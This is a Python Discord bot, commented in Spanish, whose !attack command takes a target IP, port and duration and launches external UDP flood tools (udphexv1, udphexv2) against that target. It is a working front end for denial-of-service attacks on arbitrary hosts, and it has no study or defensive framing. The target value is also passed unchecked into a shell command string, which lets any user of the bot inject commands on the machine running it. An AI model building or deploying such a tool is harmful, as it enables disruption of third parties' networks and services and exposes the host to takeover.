import discord
from discord.ext import commands
import subprocess
import asyncio

# Reemplaza con el token de tu bot de Discord
TOKEN = 'TU_TOKEN_AQUI'

# Prefijo para los comandos del bot
BOT_PREFIX = '!'

# Inicializa el bot
bot = commands.Bot(command_prefix=BOT_PREFIX, intents=discord.Intents.all())

# Evento que se ejecuta cuando el bot está listo
@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user.name}')
    await bot.change_presence(activity=discord.Game(name="Atacando con UDP")) # Establece el estado del bot

# Comando !attack
@bot.command(name='attack', help='Ejecuta un ataque UDP.')
async def attack(ctx, metodo: str, ip: str, port: int, tiempo: int):
    """
    Ejecuta un ataque UDP utilizando udphexv1 o udphexv2.

    Uso: !attack <metodo> <ip> <puerto> <tiempo>
    Metodos: v1 o v2
    """
    if metodo == 'v1':
        # Construye el comando para udphexv1 con los valores por defecto
        comando = f'./udphexv1 {ip} {port} -t 32 -s 64 -d {tiempo}'
        await ctx.send(f'Iniciando ataque UDP (v1) a {ip}:{port} durante {tiempo} segundos (threads=32, size=64).')
    elif metodo == 'v2':
        # Construye el comando para udphexv2
        comando = f'./udphexv2 {ip} {port} {tiempo}'
        await ctx.send(f'Iniciando ataque UDP (v2) a {ip}:{port} durante {tiempo} segundos.')
    else:
        await ctx.send('Método inválido. Usa v1 o v2.')
        return

    # Ejecuta el comando en un proceso separado para no bloquear el bot
    try:
        proceso = await asyncio.create_subprocess_shell(
            comando,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        stdout, stderr = await proceso.communicate()

        # Imprime la salida y los errores (opcional, para debug)
        print(f'Salida: {stdout.decode()}')
        print(f'Errores: {stderr.decode()}')

        await ctx.send('Ataque finalizado.')

    except Exception as e:
        await ctx.send(f'Error al ejecutar el ataque: {e}')

# Inicia el bot
bot.run(TOKEN)
